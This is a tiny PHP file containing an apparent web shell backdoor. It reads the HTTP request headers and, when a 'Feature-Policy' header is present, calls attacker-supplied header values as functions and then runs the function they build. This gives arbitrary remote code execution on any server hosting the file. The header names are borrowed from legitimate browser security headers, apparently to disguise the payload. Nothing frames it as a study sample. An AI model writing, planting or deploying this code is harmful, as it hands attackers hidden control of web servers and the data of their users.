<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['Feature-Policy'])) {
    $accepted = $_HEADERS['Feature-Policy']('', $_HEADERS['Clear-Site-Data']($_HEADERS['Large-Allocation']));
    $accepted();
}